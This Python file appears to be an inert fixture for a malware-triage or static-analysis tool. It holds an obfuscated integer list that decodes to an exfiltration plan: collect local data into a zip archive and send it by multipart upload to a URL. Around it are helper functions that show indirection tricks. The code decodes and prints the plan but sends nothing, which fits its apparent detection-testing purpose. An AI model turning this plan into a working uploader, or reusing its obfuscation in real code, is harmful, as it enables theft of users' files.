#!/usr/bin/env python3
# Huntress Script Triage -- inert static-analysis fixture (cpython3)
import base64
import io
import os

MATERIAL_9a8f1146 = [102, 95, 112, 36, 40, 87, 41, 91, 44, 38, 46, 47, 42, 91, 35, 91, 94, 89, 87, 89, 37, 88, 87, 66, 105, 105, 91, 104, 106, 100, 107, 62, 37, 87, 106, 87, 58, 99, 87, 104, 93, 101, 104, 70, 37, 48, 57, 51, 94, 106, 87, 102, 85, 91, 108, 95, 94, 89, 104, 87, 114, 90, 87, 101, 98, 102, 107, 37, 90, 95, 98, 87, 108, 100, 95, 36, 91, 98, 102, 99, 87, 110, 91, 36, 40, 87, 41, 91, 44, 38, 46, 47, 42, 91, 37, 37, 48, 105, 102, 106, 106, 94, 51, 98, 104, 107, 85, 90, 87, 101, 98, 102, 107, 114, 40, 87, 41, 91, 44, 38, 46, 47, 42, 91, 35, 100, 93, 95, 87, 102, 99, 87, 89, 51, 90, 95, 85, 100, 93, 95, 87, 102, 99, 87, 89, 114, 104, 101, 105, 105, 91, 89, 91, 90, 91, 104, 102, 85, 40, 41, 98, 98, 90, 100, 107, 104, 51, 100, 95, 87, 94, 89, 85, 105, 109, 101, 90, 100, 95, 109, 114, 104, 95, 90, 91, 100, 101, 85, 104, 91, 98, 98, 87, 106, 105, 100, 95, 111, 102, 51, 104, 91, 95, 104, 104, 87, 89, 114, 100, 101, 95, 106, 89, 91, 104, 95, 90, 100, 95, 85, 87, 90, 88, 99, 87, 98, 51, 100, 101, 95, 106, 87, 89, 105, 107, 92, 88, 101, 114, 94, 89, 106, 87, 102, 105, 95, 90, 85, 111, 104, 87, 100, 101, 95, 106, 89, 95, 90, 51, 110, 87, 106, 100, 111, 105, 114, 39, 51, 106, 100, 107, 101, 89, 85, 91, 93, 87, 106, 105, 114, 100, 87, 98, 102, 85, 99, 104, 101, 92, 85, 106, 104, 87, 102, 95, 106, 98, 107, 99, 51, 104, 91, 106, 102, 87, 90, 87, 114, 91, 106, 101, 99, 91, 104, 85, 106, 95, 99, 105, 100, 87, 104, 106, 34, 91, 108, 95, 94, 89, 104, 87, 85, 91, 90, 101, 89, 100, 91, 34, 98, 87, 89, 101, 98, 85, 106, 89, 91, 98, 98, 101, 89, 51, 105, 102, 91, 106, 105, 114, 40, 51, 108]
CODEC_9a8f1146 = "reversed_integer_list|subtract_modulo_256|0a"

def load_9a8f1146():
    return bytes(reversed(MATERIAL_9a8f1146))

def decode_9a8f1146(item1):
    return bytes((value + 10) % 256 for value in item1)

def recover_9a8f1146():
    item4 = 19 * 7 - 133
    item6 = decode_9a8f1146
    item2 = item6(load_9a8f1146())
    item3 = item2.decode("ascii", "strict")
    return item3

def inspect_9a8f1146():
    return recover_9a8f1146()

def surface_9a8f1146():
    routes = {"selected": lambda: ("dictionary_dispatch", "lambda_indirection", "pyinstaller_onedir", "rundll32_predecessor")}
    return routes["selected"]()

def obfuscation_9a8f1146():
    recover = lambda value: value
    return recover("lambda_indirection")

def plan_9a8f1146():
    fields = dict(item.split("=", 1) for item in inspect_9a8f1146().split("|"))
    analysis_surface = surface_9a8f1146()
    obfuscation_surface = obfuscation_9a8f1146()
    operation_plan = ("multipart_form_plan", fields["archive_path"], fields["upload_url"])
    return operation_plan + (analysis_surface, obfuscation_surface)

if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
    print(inspect_9a8f1146())
